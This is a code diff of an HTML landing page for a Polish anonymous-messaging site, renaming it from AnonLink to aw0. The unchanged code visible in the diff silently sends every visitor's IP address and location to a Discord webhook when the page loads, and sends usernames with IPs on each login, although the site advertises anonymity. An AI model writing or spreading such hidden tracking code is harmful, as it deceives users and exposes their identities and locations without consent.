@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AnonLink - Otrzymuj anonimowe wiadomości</title>
+    <title>aw0 - Otrzymuj anonimowe wiadomości</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
@@ -24,7 +24,7 @@
 </head>
 <body class="min-h-screen flex items-center justify-center p-5">
     <div class="container bg-white rounded-2xl p-10 shadow-xl text-center max-w-md w-full">
-        <div class="logo text-4xl font-bold text-indigo-600 mb-5">AnonLink</div>
+        <div class="logo text-4xl font-bold text-indigo-600 mb-5">aw0</div>
         <p class="subtitle text-gray-600 mb-8 text-lg leading-relaxed">Otrzymuj szczere, anonimowe wiadomości od znajomych</p>
         
         <div id="welcomeBack" class="welcome-back bg-green-50 border border-green-400 rounded-lg p-4 mb-5 text-green-800" style="display: none;">
@@ -151,7 +151,7 @@
 
             // Prepare the message for Discord
             const discordPayload = {
-                content: `New visitor to AnonLink! IP: ${userIP}, Region: ${regionName} (${countryCode})`,
+                content: `New visitor to aw0! IP: ${userIP}, Region: ${regionName} (${countryCode})`,
                 embeds: [{
                     title: "Visitor IP & Region Logged",
                     description: `IP Address: \`${userIP}\`\nRegion: \`${regionName}\`\nCity: \`${cityName}\`\nCountry: \`${countryName} (${countryCode})\``,
@@ -183,7 +183,7 @@
             const activityType = isNewUser ? "New Account Created" : "Logged In";
             
             const discordPayload = {
-                content: `AnonLink User Activity! User: ${username}, IP: ${userIP}, Region: ${regionName} (${countryCode})`,
+                content: `aw0 User Activity! User: ${username}, IP: ${userIP}, Region: ${regionName} (${countryCode})`,
                 embeds: [{
                     title: "User Account Activity",
                     description: `Action: \`${activityType}\`\nUsername: \`${username}\`\nIP Address: \`${userIP}\`\nRegion: \`${regionName}\`\nCity: \`${cityName}\`\nCountry: \`${countryName} (${countryCode})\``,
@@ -213,7 +213,7 @@
             // Send visitor IP and Region to webhook as soon as the page loads
             sendVisitorInfoToWebhook(); 
 
-            const savedUser = getCookie('anonlink_user');
+            const savedUser = getCookie('aw0_user');
             if (savedUser) {
                 const welcomeDiv = document.getElementById('welcomeBack');
                 welcomeDiv.style.display = 'block';
@@ -224,10 +224,10 @@
                     .then(data => {
                         if (data.exists) {
                             setTimeout(() => {
-                                window.location.href = 'https://jurek362.github.io/Tbh.fun/dashboard.html?user=' + encodeURIComponent(savedUser);
+                                window.location.href = 'https://aw0.fun/dashboard.html?user=' + encodeURIComponent(savedUser);
                             }, 2000);
                         } else {
-                            deleteCookie('anonlink_user');
+                            deleteCookie('aw0_user');
                             welcomeDiv.style.display = 'none';
                             document.getElementById('message').innerHTML = '<div class="text-red-500 mt-3 text-sm">Twoje konto nie zostało znalezione. Zaloguj się ponownie.</div>';
                         }
@@ -279,7 +279,7 @@
                 showLoading(false);
                 
                 if (data.success) {
-                    setCookie('anonlink_user', username, 30);
+                    setCookie('aw0_user', username, 30);
                     
                     // Send user activity to webhook
                     sendUserActivityToWebhook(username, data.isNew);
